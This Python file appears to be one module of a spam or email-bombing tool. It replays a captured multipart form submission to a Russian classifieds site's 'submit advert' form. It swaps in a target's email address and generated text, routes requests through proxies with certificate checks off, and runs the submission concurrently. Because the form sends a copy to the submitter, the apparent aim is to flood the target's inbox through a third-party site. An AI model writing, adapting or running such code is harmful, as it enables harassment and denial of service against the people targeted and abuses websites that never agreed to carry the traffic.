import requests

from module.spam_abstraction import Spam

headers = {
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary6esDHvh7GLEzZB3b',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}
url = 'https://xn--80aaf4abkmbdych.xn--p1ai/action.modal/modelName/Advert'
DATA = '------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="Advert[name]"\r\n\r\ntest https://xn--80aaf4abkmbdych.xn--p1ai/action.modal/modelName/Advert\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="AddFields[username]"\r\n\r\ntest https://xn--80aaf4abkmbdych.xn--p1ai/action.modal/modelName/Advert\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="AddFields[email]"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="AddFields[phone]"\r\n\r\ntest https://xn--80aaf4abkmbdych.xn--p1ai/action.modal/modelName/Advert\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="Advert[description]"\r\n\r\ntest https://xn--80aaf4abkmbdych.xn--p1ai/action.modal/modelName/Advert\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="AddFields[images][]"\r\n\r\n\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="AddFields[images][]"\r\n\r\n\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="tgdhYSf_mV3J3phTV4yMCnpzsUf@rMS2"\r\n\r\n\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="copyForMe"\r\n\r\n1\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b\r\nContent-Disposition: form-data; name="yt0"\r\n\r\nПодать объявление\r\n------WebKitFormBoundary6esDHvh7GLEzZB3b--\r\n'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response:
        data = DATA.replace('softumwork@gmail.com', target)
        data = data.replace('test', self.get_text(False)).encode().decode('latin-1')

        response = requests.post(url, headers=headers, data=data, proxies=self.get_proxies(), verify=False)
        return response


if __name__ == '__main__':
    success_message = 'Ваше объявление было успешно отправлено.'
    project_name = 'p1ai'  # 3GR3hOl
    spam = ConcreteSpam(project_name, success_message)
    res = spam.send_post()  # True
    if res:
        spam.run_concurrently()
